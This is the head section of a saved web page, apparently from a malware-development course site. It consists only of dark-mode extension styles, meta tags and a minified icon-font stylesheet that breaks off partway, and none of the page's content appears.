<!DOCTYPE html>
<html class="dark" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><script type="text/javascript" src="27_files/inject.js"></script><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
html {
    background-color: var(--darkreader-background-ffffff, #181a1b) !important;
}
html {
    color-scheme: dark !important;
}
iframe {
    color-scheme: dark !important;
}
html, body {
    background-color: var(--darkreader-background-ffffff, #181a1b);
}
html, body {
    border-color: var(--darkreader-border-4c4c4c, #736b5e);
    color: var(--darkreader-text-000000, #e8e6e3);
}
a {
    color: var(--darkreader-text-0040ff, #3391ff);
}
table {
    border-color: var(--darkreader-border-808080, #545b5e);
}
mark {
    color: var(--darkreader-text-000000, #e8e6e3);
}
::placeholder {
    color: var(--darkreader-text-a9a9a9, #b2aba1);
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: var(--darkreader-background-faffbd, #404400) !important;
    color: var(--darkreader-text-000000, #e8e6e3) !important;
}
* {
    scrollbar-color: var(--darkreader-background-b0b0b0, #454a4d) var(--darkreader-background-f1f1f1, #202324);
}
::selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
::-moz-selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
}</style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, img.Wirisformula, a[data-testid="headerMediumLogo"]>svg, .d2l-navigation-link-image-container, .d2l-iframe-loading-container {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}
[data-darkreader-inline-stopcolor] {
  stop-color: var(--darkreader-inline-stopcolor) !important;
}
[data-darkreader-inline-bg] {
  background: var(--darkreader-inline-bg) !important;
}
[data-darkreader-inline-border-short] {
  border: var(--darkreader-inline-border-short) !important;
}
[data-darkreader-inline-border-bottom-short] {
  border-bottom: var(--darkreader-inline-border-bottom-short) !important;
}
[data-darkreader-inline-border-left-short] {
  border-left: var(--darkreader-inline-border-left-short) !important;
}
[data-darkreader-inline-border-right-short] {
  border-right: var(--darkreader-inline-border-right-short) !important;
}
[data-darkreader-inline-border-top-short] {
  border-top: var(--darkreader-inline-border-top-short) !important;
}
[data-darkreader-inline-invert] {
    filter: invert(100%) hue-rotate(180deg);
}</style><style class="darkreader darkreader--variables" media="screen">:root {
   --darkreader-neutral-background: var(--darkreader-background-ffffff, #181a1b);
   --darkreader-neutral-text: var(--darkreader-text-000000, #e8e6e3);
   --darkreader-selection-background: var(--darkreader-background-0060d4, #004daa);
   --darkreader-selection-text: var(--darkreader-text-ffffff, #e8e6e3);
}</style><style class="darkreader darkreader--root-vars" media="screen"></style>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link rel="stylesheet" href="27_files/template.css"><style class="darkreader darkreader--sync" media="screen"></style>
        <link rel="shortcut icon" href="https://maldevacademy.com/maldev-icon.png">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="27_files/font-awesome.min.css"><style class="darkreader darkreader--cors" media="screen">.fa{display:inline-block;font:normal normal normal 14px/1 FontAwesome;font-size:inherit;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.fa-lg{font-size:1.33333333em;line-height:.75em;vertical-align:-15%}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-fw{width:1.28571429em;text-align:center}.fa-ul{padding-left:0;margin-left:2.14285714em;list-style-type:none}.fa-ul>li{position:relative}.fa-li{position:absolute;left:-2.14285714em;width:2.14285714em;top:.14285714em;text-align:center}.fa-li.fa-lg{left:-1.85714286em}.fa-border{padding:.2em .25em .15em;border:solid .08em #eee;border-radius:.1em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left{margin-right:.3em}.fa.fa-pull-right{margin-left:.3em}.pull-right{float:right}.pull-left{float:left}.fa.pull-left{margin-right:.3em}.fa.pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}.fa-rotate-90{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";-webkit-transform:scale(-1, 1);-ms-transform:scale(-1, 1);transform:scale(-1, 1)}.fa-flip-vertical{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";-webkit-transform:scale(1, -1);-ms-transform:scale(1, -1);transform:scale(1, -1)}:root .fa-rotate-90,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-flip-horizontal,:root .fa-flip-vertical{filter:none}.fa-stack{position:relative;display:inline-block;width:2em;height:2em;line-height:2em;vertical-align:middle}.fa-stack-1x,.fa-stack-2x{position:absolute;left:0;width:100%;text-align:center}.fa-stack-1x{line-height:inherit}.fa-stack-2x{font-size:2em}.fa-inverse{color:#fff}.fa-glass:before{content:"\f000"}.fa-music:before{content:"\f001"}.fa-search:before{content:"\f002"}.fa-envelope-o:before{content:"\f003"}.fa-heart:before{content:"\f004"}.fa-star:before{content:"\f005"}.fa-star-o:before{content:"\f006"}.fa-user:before{content:"\f007"}.fa-film:before{content:"\f008"}.fa-th-large:before{content:"\f009"}.fa-th:before{content:"\f00a"}.fa-th-list:before{content:"\f00b"}.fa-check:before{content:"\f00c"}.fa-remove:before,.fa-close:before,.fa-times:before{content:"\f00d"}.fa-search-plus:before{content:"\f00e"}.fa-search-minus:before{content:"\f010"}.fa-power-off:before{content:"\f011"}.fa-signal:before{content:"\f012"}.fa-gear:before,.fa-cog:before{content:"\f013"}.fa-trash-o:before{content:"\f014"}.fa-home:before{content:"\f015"}.fa-file-o:before{content:"\f016"}.fa-clock-o:before{content:"\f017"}.fa-road:before{content:"\f018"}.fa-download:before{content:"\f019"}.fa-arrow-circle-o-down:before{content:"\f01a"}.fa-arrow-circle-o-up:before{content:"\f01b"}.fa-inbox:before{content:"\f01c"}.fa-play-circle-o:before{content:"\f01d"}.fa-rotate-right:before,.fa-repeat:before{content:"\f01e"}.fa-refresh:before{content:"\f021"}.fa-list-alt:before{content:"\f022"}.fa-lock:before{content:"\f023"}.fa-flag:before{content:"\f024"}.fa-headphones:before{content:"\f025"}.fa-volume-off:before{content:"\f026"}.fa-volume-down:before{content:"\f027"}.fa-volume-up:before{content:"\f028"}.fa-qrcode:before{content:"\f029"}.fa-barcode:before{content:"\f02a"}.fa-tag:before{content:"\f02b"}.fa-tags:before{content:"\f02c"}.fa-book:before{content:"\f02d"}.fa-bookmark:before{content:"\f02e"}.fa-print:before{content:"\f02f"}.fa-camera:before{content:"\f030"}.fa-font:before{content:"\f031"}.fa-bold:before{content:"\f032"}.fa-italic:before{content:"\f033"}.fa-text-height:before{content:"\f034"}.fa-text-width:before{content:"\f035"}.fa-align-left:before{content:"\f036"}.fa-align-center:before{content:"\f037"}.fa-align-right:before{content:"\f038"}.fa-align-justify:before{content:"\f039"}.fa-list:before{content:"\f03a"}.fa-dedent:before,.fa-outdent:before{content:"\f03b"}.fa-indent:before{content:"\f03c"}.fa-video-camera:before{content:"\f03d"}.fa-photo:before,.fa-image:before,.fa-picture-o:before{content:"\f03e"}.fa-pencil:before{content:"\f040"}.fa-map-marker:before{content:"\f041"}.fa-adjust:before{content:"\f042"}.fa-tint:before{content:"\f043"}.fa-edit:before,.fa-pencil-square-o:before{content:"\f044"}.fa-share-square-o:before{content:"\f045"}.fa-check-square-o:before{content:"\f046"}.fa-arrows:before{content:"\f047"}.fa-step-backward:before{content:"\f048"}.fa-fast-backward:before{content:"\f049"}.fa-backward:before{content:"\f04a"}.fa-play:before{content:"\f04b"}.fa-pause:before{content:"\f04c"}.fa-stop:before{content:"\f04d"}.fa-forward:before{content:"\f04e"}.fa-fast-forward:before{content:"\f050"}.fa-step-forward:before{content:"\f051"}.fa-eject:before{content:"\f052"}.fa-chevron-left:before{content:"\f053"}.fa-chevron-right:before{content:"\f054"}.fa-plus-circle:before{content:"\f055"}.fa-minus-circle:before{content:"\f056"}.fa-times-circle:before{content:"\f057"}.fa-check-circle:before{content:"\f058"}.fa-question-circle:before{content:"\f059"}.fa-info-circle:before{content:"\f05a"}.fa-crosshairs:before{content:"\f05b"}.fa-times-circle-o:before{content:"\f05c"}.fa-check-circle-o:before{content:"\f05d"}.fa-ban:before{content:"\f05e"}.fa-arrow-left:before{content:"\f060"}.fa-arrow-right:before{content:"\f061"}.fa-arrow-up:before{content:"\f062"}.fa-arrow-down:before{content:"\f063"}.fa-mail-forward:before,.fa-share:before{content:"\f064"}.fa-expand:before{content:"\f065"}.fa-compress:before{content:"\f066"}.fa-plus:before{content:"\f067"}.fa-minus:before{content:"\f068"}.fa-asterisk:before{content:"\f069"}.fa-exclamation-circle:before{content:"\f06a"}.fa-gift:before{content:"\f06b"}.fa-leaf:before{content:"\f06c"}.fa-fire:before{content:"\f06d"}.fa-eye:before{content:"\f06e"}.fa-eye-slash:before{content:"\f070"}.fa-warning:before,.fa-exclamation-triangle:before{content:"\f071"}.fa-plane:before{content:"\f072"}.fa-calendar:before{content:"\f073"}.fa-random:before{content:"\f074"}.fa-comment:before{content:"\f075"}.fa-magnet:before{content:"\f076"}.fa-chevron-up:before{content:"\f077"}.fa-chevron-down:before{content:"\f078"}.fa-retweet:before{content:"\f079"}.fa-shopping-cart:before{content:"\f07a"}.fa-folder:before{content:"\f07b"}.fa-folder-open:before{content:"\f07c"}.fa-arrows-v:before{content:"\f07d"}.fa-arrows-h:before{content:"\f07e"}.fa-bar-chart-o:before,.fa-bar-chart:before{content:"\f080"}.fa-twitter-square:before{content:"\f081"}.fa-facebook-square:before{content:"\f082"}.fa-camera-retro:before{content:"\f083"}.fa-key:before{content:"\f084"}.fa-gears:before,.fa-cogs:before{content:"\f085"}.fa-comments:before{content:"\f086"}.fa-thumbs-o-up:before{content:"\f087"}.fa-thumbs-o-down:before{content:"\f088"}.fa-star-half:before{content:"\f089"}.fa-heart-o:before{content:"\f08a"}.fa-sign-out:before{content:"\f08b"}.fa-linkedin-square:before{content:"\f08c"}.fa-thumb-tack:before{content:"\f08d"}.fa-external-link:before{content:"\f08e"}.fa-sign-in:before{content:"\f090"}.fa-trophy:before{content:"\f091"}.fa-github-square:before{content:"\f092"}.fa-upload:before{content:"\f093"}.fa-lemon-o:before{content:"\f094"}.fa-phone:before{content:"\f095"}.fa-square-o:before{content:"\f096"}.fa-bookmark-o:before{content:"\f097"}.fa-phone-square:before{content:"\f098"}.fa-twitter:before{content:"\f099"}.fa-facebook-f:before,.fa-facebook:before{content:"\f09a"}.fa-github:before{content:"\f09b"}.fa-unlock:before{content:"\f09c"}.fa-credit-card:before{content:"\f09d"}.fa-feed:before,.fa-rss:before{content:"\f09e"}.fa-hdd-o:before{content:"\f0a0"}.fa-bullhorn:before{content:"\f0a1"}.fa-bell:before{content:"\f0f3"}.fa-certificate:before{content:"\f0a3"}.fa-hand-o-right:before{content:"\f0a4"}.fa-hand-o-left:before{content:"\f0a5"}.fa-hand-o-up:before{content:"\f0a6"}.fa-hand-o-down:before{content:"\f0a7"}.fa-arrow-circle-left:before{content:"\f0a8"}.fa-arrow-circle-right:before{content:"\f0a9"}.fa-arrow-circle-up:before{content:"\f0aa"}.fa-arrow-circle-down:before{content:"\f0ab"}.fa-globe:before{content:"\f0ac"}.fa-wrench:before{content:"\f0ad"}.fa-tasks:before{content:"\f0ae"}.fa-filter:before{content:"\f0b0"}.fa-briefcase:before{content:"\f0b1"}.fa-arrows-alt:before{content:"\f0b2"}.fa-group:before,.fa-users:before{content:"\f0c0"}.fa-chain:before,.fa-link:before{content:"\f0c1"}.fa-cloud:before{content:"\f0c2"}.fa-flask:before{content:"\f0c3"}.fa-cut:before,.fa-scissors:before{content:"\f0c4"}.fa-copy:before,.fa-files-o:before{content:"\f0c5"}.fa-paperclip:before{content:"\f0c6"}.fa-save:before,.fa-floppy-o:before{content:"\f0c7"}.fa-square:before{content:"\f0c8"}.fa-navicon:before,.fa-reorder:before,.fa-bars:before{content:"\f0c9"}.fa-list-ul:before{content:"\f0ca"}.fa-list-ol:before{content:"\f0cb"}.fa-strikethrough:before{content:"\f0cc"}.fa-underline:before{content:"\f0cd"}.fa-table:before{content:"\f0ce"}.fa-magic:before{content:"\f0d0"}.fa-truck:before{content:"\f0d1"}.fa-pinterest:before{content:"\f0d2"}.fa-pinterest-square:before{content:"\f0d3"}.fa-google-plus-square:before{content:"\f0d4"}.fa-google-plus:before{content:"\f0d5"}.fa-money:before{content:"\f0d6"}.fa-caret-down:before{content:"\f0d7"}.fa-caret-up:before{content:"\f0d8"}.fa-caret-left:before{content:"\f0d9"}.fa-caret-right:before{content:"\f0da"}.fa-columns:before{content:"\f0db"}.fa-unsorted:before,.fa-sort:before{content:"\f0dc"}.fa-sort-down:before,.fa-sort-desc:before{content:"\f0dd"}.fa-sort-up:before,.fa-sort-asc:before{content:"\f0de"}.fa-envelope:before{content:"\f0e0"}.fa-linkedin:before{content:"\f0e1"}.fa-rotate-left:before,.fa-undo:before{content:"\f0e2"}.fa-legal:before,.fa-gavel:before{content:"\f0e3"}.fa-dashboard:before,.fa-tachometer:before{content:"\f0e4"}.fa-comment-o:before{content:"\f0e5"}.fa-comments-o:before{content:"\f0e6"}.fa-flash:before,.fa-bolt:before{content:"\f0e7"}.fa-sitemap:before{content:"\f0e8"}.fa-umbrella:before{content:"\f0e9"}.fa-paste:before,.fa-clipboard:before{content:"\f0ea"}.fa-lightbulb-o:before{content:"\f0eb"}.fa-exchange:before{content:"\f0ec"}.fa-cloud-download:before{content:"\f0ed"}.fa-cloud-upload:before{content:"\f0ee"}.fa-user-md:before{content:"\f0f0"}.fa-stethoscope:before{content:"\f0f1"}.fa-suitcase:before{content:"\f0f2"}.fa-bell-o:before{content:"\f0a2"}.fa-coffee:before{content:"\f0f4"}.fa-cutlery:before{content:"\f0f5"}.fa-file-text-o:before{content:"\f0f6"}.fa-building-o:before{content:"\f0f7"}.fa-hospital-o:before{content:"\f0f8"}.fa-ambulance:before{content:"\f0f9"}.fa-medkit:before{content:"\f0fa"}.fa-fighter-jet:before{content:"\f0fb"}.fa-beer:before{content:"\f0fc"}.fa-h-square:before{content:"\f0fd"}.fa-plus-square:before{content:"\f0fe"}.fa-angle-double-left:before{content:"\f100"}.fa-angle-double-right:before{content:"\f101"}.fa-angle-double-up:before{content:"\f102"}.fa-angle-double-down:before{content:"\f103"}.fa-angle-left:before{content:"\f104"}.fa-angle-right:before{content:"\f105"}.fa-angle-up:before{content:"\f106"}.fa-angle-down:before{content:"\f107"}.fa-desktop:before{content:"\f108"}.fa-laptop:before{content:"\f109"}.fa-tablet:before{content:"\f10a"}.fa-mobile-phone:before,.fa-mobile:before{content:"\f10b"}.fa-circle-o:before{content:"\f10c"}.fa-quote-left:before{content:"\f10d"}.fa-quote-right:before{content:"\f10e"}.fa-spinner:before{content:"\f110"}.fa-circle:before{content:"\f111"}.fa-mail-reply:before,.fa-reply:before{content:"\f112"}.fa-github-alt:before{content:"\f113"}.fa-folder-o:before{content:"\f114"}.fa-folder-open-o:before{content:"\f115"}.fa-smile-o:before{content:"\f118"}.fa-frown-o:before{content:"\f119"}.fa-meh-o:before{content:"\f11a"}.fa-gamepad:before{content:"\f11b"}.fa-keyboard-o:before{content:"\f11c"}.fa-flag-o:before{content:"\f11d"}.fa-flag-checkered:before{content:"\f11e"}.fa-terminal:before{content:"\f120"}.fa-code:before{content:"\f121"}.fa-mail-reply-all:before,.fa-reply-all:before{content:"\f122"}.fa-star-half-empty:before,.fa-star-half-full:before,.fa-star-half-o:before{content:"\f123"}.fa-location-arrow:before{content:"\f124"}.fa-crop:before{content:"\f125"}.fa-code-fork:before{content:"\f126"}.fa-unlink:before,.fa-chain-broken:before{content:"\f127"}.fa-question:before{content:"\f128"}.fa-info:before{content:"\f129"}.fa-exclamation:before{content:"\f12a"}.fa-superscript:before{content:"\f12b"}.fa-subscript:before{content:"\f12c"}.fa-eraser:before{content:"\f12d"}.fa-puzzle-piece:before{content:"\f12e"}.fa-microphone:before{content:"\f130"}.fa-microphone-slash:before{content:"\f131"}.fa-shield:before{content:"\f132"}.fa-calendar-o:before{content:"\f133"}.fa-fire-extinguisher:before{content:"\f134"}.fa-rocket:before{content:"\f135"}.fa-maxcdn:before{content:"\f136"}.fa-chevron-circle-left:before{content:"\f137"}.fa-chevron-circle-right:before{content:"\f138"}.fa-chevron-circle-up:before{content:"\f139"}.fa-chevron-circle-down:before{content:"\f13a"}.fa-html5:before{content:"\f13b"}.fa-css3:before{content:"\f13c"}.fa-anchor:before{content:"\f13d"}.fa-unlock-alt:before{content:"\f13e"}.fa-bullseye:before{content:"\f140"}.fa-ellipsis-h:before{content:"\f141"}.fa-ellipsis-v:before{content:"\f142"}.fa-rss-square:before{content:"\f143"}.fa-play-circle:before{content:"\f144"}.fa-ticket:before{content:"\f145"}.fa-minus-square:before{content:"\f146"}.fa-minus-square-o:before{content:"\f147"}.fa-level-up:before{content:"\f148"}.fa-level-down:before{content:"\f149"}.fa-check-square:before{content:"\f14a"}.fa-pencil-square:before{content:"\f14b"}.fa-external-link-square:before{content:"\f14c"}.fa-share-square:before{content:"\f14d"}.fa-compass:before{content:"\f14e"}.fa-toggle-down:before,.fa-caret-square-o-down:before{content:"\f150"}.fa-toggle-up:before,.fa-caret-square-o-up:before{content:"\f151"}.fa-toggle-right:before,.fa-caret-square-o-right:before{content:"\f152"}.fa-euro:before,.fa-eur:before{content:"\f153"}.fa-gbp:before{content:"\f154"}.fa-dollar:before,.fa-usd:before{content:"\f155"}.fa-rupee:before,.fa-inr:before{content:"\f156"}.fa-cny:before,.fa-rmb:before,.fa-yen:before,.fa-jpy:before{content:"\f157"}.fa-ruble:before,.fa-rouble:before,.fa-rub:before{content:"\f158"}.fa-won:before,.fa-krw:before{content:"\f159"}.fa-bitcoin:before,.fa-btc:before{content:"\f15a"}.fa-file:before{content:"\f15b"}.fa-file-text:before{content:"\f15c"}.fa-sort-alpha-asc:before{content:"\f15d"}.fa-sort-alpha-desc:before{content:"\f15e"}.fa-sort-amount-asc:before{content:"\f160"}.fa-sort-amount-desc:before{content:"\f161"}.fa-sort-numeric-asc:before{content:"\f162"}.fa-sort-numeric-desc:before{content:"\f163"}.fa-thumbs-up:before{content:"\f164"}.fa-thumbs-down:before{content:"\f165"}.fa-youtube-square:before{content:"\f166"}.fa-youtube:before{content:"\f167"}.fa-xing:before{content:"\f168"}.fa-xing-square:before{content:"\f169"}.fa-youtube-play:before{content:"\f16a"}.fa-dropbox:before{content:"\f16b"}.fa-stack-overflow:before{content:"\f16c"}.fa-instagram:before{content:"\f16d"}.fa-flickr:before{content:"\f16e"}.fa-adn:before{content:"\f170"}.fa-bitbucket:before{content:"\f171"}.fa-bitbucket-square:before{content:"\f172"}.fa-tumblr:before{content:"\f173"}.fa-tumblr-square:before{content:"\f174"}.fa-long-arrow-down:before{content:"\f175"}.fa-long-arrow-up:before{content:"\f176"}.fa-long-arrow-left:before{content:"\f177"}.fa-long-arrow-right:before{content:"\f178"}.fa-apple:before{content:"\f179"}.fa-windows:before{content:"\f17a"}.fa-android:before{content:"\f17b"}.fa-linux:before{content:"\f17c"}.fa-dribbble:before{content:"\f17d"}.fa-skype:before{content:"\f17e"}.fa-foursquare:before{content:"\f180"}.fa-trello:before{content:"\f181"}.fa-female:before{content:"\f182"}.fa-male:before{content:"\f183"}.fa-gittip:before,.fa-gratipay:before{content:"\f184"}.fa-sun-o:before{content:"\f185"}.fa-moon-o:before{content:"\f186"}.fa-archive:before{content:"\f187"}.fa-bug:before{content:"\f188"}.fa-vk:before{content:"\f189"}.fa-weibo:before{content:"\f18a"}.fa-renren:before{content:"\f18b"}.fa-pagelines:before{content:"\f18c"}.fa-stack-exchange:before{content:"\f18d"}.fa-arrow-circle-o-right:before{content:"\f18e"}.fa-arrow-circle-o-left:before{content:"\f190"}.fa-toggle-left:before,.fa-caret-square-o-left:before{content:"\f191"}.fa-dot-circle-o:before{content:"\f192"}.fa-wheelchair:before{content:"\f193"}.fa-vimeo-square:before{content:"\f194"}.fa-turkish-lira:before,.fa-try:before{content:"\f195"}.fa-plus-square-o:before{content:"\f196"}.fa-space-shuttle:before{content:"\f197"}.fa-slack:before{content:"\f198"}.fa-envelope-square:before{content:"\f199"}.fa-wordpress:before{content:"\f19a"}.fa-openid:before{content:"\f19b"}.fa-institution:before,.fa-bank:before,.fa-university:before{content:"\f19c"}.fa-mortar-board:before,.fa-graduation-cap:before{content:"\f19d"}.fa-yahoo:before{content:"\f19e"}.fa-google:before{content:"\f1a0"}.fa-reddit:before{content:"\f1a1"}.fa-reddit-square:before{content:"\f1a2"}.fa-stumbleupon-circle:before{content:"\f1a3"}.fa-stumbleupon:before{content:"\f1a4"}.fa-delicious:before{content:"\f1a5"}.fa-digg:before{content:"\f1a6"}.fa-pied-piper-pp:before{content:"\f1a7"}.fa-pied-piper-alt:before{content:"\f1a8"}.fa-drupal:before{content:"\f1a9"}.fa-joomla:before{content:"\f1aa"}.fa-language:before{content:"\f1ab"}.fa-fax:before{content:"\f1ac"}.fa-building:before{content:"\f1ad"}.fa-child:before{content:"\f1ae"}.fa-paw:before{content:"\f1b0"}.fa-spoon:before{content:"\f1b1"}.fa-cube:before{content:"\f1b2"}.fa-cubes:before{content:"\f1b3"}.fa-behance:before{content:"\f1b4"}.fa-behance-square:before{content:"\f1b5"}.fa-steam:before{content:"\f1b6"}.fa-steam-square:before{content:"\f1b7"}.fa-recycle:before{content:"\f1b8"}.fa-automobile:before,.fa-car:before{content:"\f1b9"}.fa-cab:before,.fa-taxi:before{content:"\f1ba"}.fa-tree:before{content:"\f1bb"}.fa-spotify:before{content:"\f1bc"}.fa-deviantart:before{content:"\f1bd"}.fa-soundcloud:before{content:"\f1be"}.fa-database:before{content:"\f1c0"}.fa-file-pdf-o:before{content:"\f1c1"}.fa-file-word-o:before{content:"\f1c2"}.fa-file-excel-o:before{content:"\f1c3"}.fa-file-powerpoint-o:before{content:"\f1c4"}.fa-file-photo-o:before,.fa-file-picture-o:before,.fa-file-image-o:before{content:"\f1c5"}.fa-file-zip-o:before,.fa-file-archive-o:before{content:"\f1c6"}.fa-file-sound-o:before,.fa-file-audio-o:before{content:"\f1c7"}.fa-file-movie-o:before,.fa-file-video-o:before{content:"\f1c8"}.fa-file-code-o:before{content:"\f1c9"}.fa-vine:before{content:"\f1ca"}.fa-codepen:before{content:"\f1cb"}.fa-jsfiddle:before{content:"\f1cc"}.fa-life-bouy:before,.fa-life-buoy:before,.fa-life-saver:before,.fa-support:before,.fa-life-ring:before{content:"\f1cd"}.fa-circle-o-notch:before{content:"\f1ce"}.fa-ra:before,.fa-resistance:before,.fa-rebel:before{content:"\f1d0"}.fa-ge:before,.fa-empire:before{content:"\f1d1"}.fa-git-square:before{content:"\f1d2"}.fa-git:before{content:"\f1d3"}.fa-y-combinator-square:before,.fa-yc-square:before,.fa-hacker-news:before{content:"\f1d4"}.fa-tencent-weibo:before{content:"\f1d5"}.fa-qq:before{content:"\f1d6"}.fa-wechat:before,.fa-weixin:before{content:"\f1d7"}.fa-send:before,.fa-paper-plane:before{content:"\f1d8"}.fa-send-o:before,.fa-paper-plane-o:before{content:"\f1d9"}.fa-history:before{content:"\f1da"}.fa-circle-thin:before{content:"\f1db"}.fa-header:before{content:"\f1dc"}.fa-paragraph:before{content:"\f1dd"}.fa-sliders:before{content:"\f1de"}.fa-share-alt:before{content:"\f1e0"}.fa-share-alt-square:before{content:"\f1e1"}.fa-bomb:before{content:"\f1e2"}.fa-soccer-ball-o:before,.fa-futbol-o:before{content:"\f1e3"}.fa-tty:before{content:"\f1e4"}.fa-binoculars:before{content:"\f1e5"}.fa-plug:before{content:"\f1e6"}.fa-slideshare:before{content:"\f1e7"}.fa-twitch:before{content:"\f1e8"}.fa-yelp:before{content:"\f1e9"}.fa-newspaper-o:before{content:"\f1ea"}.fa-wifi:before{content:"\f1eb"}.fa-calculator:before{content:"\f1ec"}.fa-paypal:before{content:"\f1ed"}.fa-google-wallet:before{content:"\f1ee"}.fa-cc-visa:before{content:"\f1f0"}.fa-cc-mastercard:before{content:"\f1f1"}.fa-cc-discover:before{content:"\f1f2"}.fa-cc-amex:before{content:"\f1f3"}.fa-cc-paypal:before{content:"\f1f4"}.fa-cc-stripe:before{content:"\f1f5"}.fa-bell-slash:before{content:"\f1f6"}.fa-bell-slash-o:before{content:"\f1f7"}.fa-trash:before{content:"\f1f8"}.fa-copyright:before{content:"\f1f9"}.fa-at:before{content:"\f1fa"}.fa-eyedropper:before{content:"\f1fb"}.fa-paint-brush:before{content:"\f1fc"}.fa-birthday-cake:before{content:"\f1fd"}.fa-area-chart:before{content:"\f1fe"}.fa-pie-chart:before{content:"\f200"}.fa-line-chart:before{content:"\f201"}.fa-lastfm:before{content:"\f202"}.fa-lastfm-square:before{content:"\f203"}.fa-toggle-off:before{content:"\f204"}.fa-toggle-on:before{content:"\f205"}.fa-bicycle:before{content:"\f206"}.fa-bus:before{content:"\f207"}.fa-ioxhost:before{content:"\f208"}.fa-angellist:before{content:"\f209"}.fa-cc:before{content:"\f20a"}.fa-shekel:before,.fa-sheqel:before,.fa-ils:before{content:"\f20b"}.fa-meanpath:before{content:"\f20c"}.fa-buysellads:before{content:"\f20d"}.fa-connectdevelop:before{content:"\f20e"}.fa-dashcube:before{content:"\f210"}.fa-forumbee:before{content:"\f211"}.fa-leanpub:before{content:"\f212"}.fa-sellsy:before{content:"\f213"}.fa-shirtsinbulk:before{content:"\f214"}.fa-simplybuilt:before{content:"\f215"}.fa-skyatlas:before{content:"\f216"}.fa-cart-plus:before{content:"\f217"}.fa-cart-arrow-down:before{content:"\f218"}.fa-diamond:before{content:"\f219"}.fa-ship:before{content:"\f21a"}.fa-user-secret:before{content:"\f21b"}.fa-motorcycle:before{content:"\f21c"}.fa-street-view:before{content:"\f21d"}.fa-heartbeat:before{content:"\f21e"}.fa-venus:before{content:"\f221"}.fa-mars:before{content:"\f222"}.fa-mercury:before{content:"\f223"}.fa-intersex:before,.fa-transgender:before{content:"\f224"}.fa-transgender-alt:before{content:"\f225"}.fa-venus-double:before{content:"\f226"}.fa-mars-double:before{content:"\f227"}.fa-venus-mars:before{content:"\f228"}.fa-mars-stroke:before{content:"\f229"}.fa-mars-stroke-v:before{content:"\f22a"}.fa-mars-stroke-h:before{content:"\f22b"}.fa-neuter:before{content:"\f22c"}.fa-genderless:before{content:"\f22d"}.fa-facebook-official:before{content:"\f230"}.fa-pinterest-p:before{content:"\f231"}.fa-whatsapp:before{content:"\f232"}.fa-server:before{content:"\f233"}.fa-user-plus:before{content:"\f234"}.fa-user-times:before{content:"\f235"}.fa-hotel:before,.fa-bed:before{content:"\f236"}.fa-viacoin:before{content:"\f237"}.fa-train:before{content:"\f238"}.fa-subway:before{content:"\f239"}.fa-medium:before{content:"\f23a"}.fa-yc:before,.fa-y-combinator:before{content:"\f23b"}.fa-optin-monster:before{content:"\f23c"}.fa-opencart:before{content:"\f23d"}.fa-expeditedssl:before{content:"\f23e"}.fa-battery-4:before,.fa-battery:before,.fa-battery-full:before{content:"\f240"}.fa-battery-3:before,.fa-battery-three-quarters:before{content:"\f241"}.fa-battery-2:before,.fa-battery-half:before{content:"\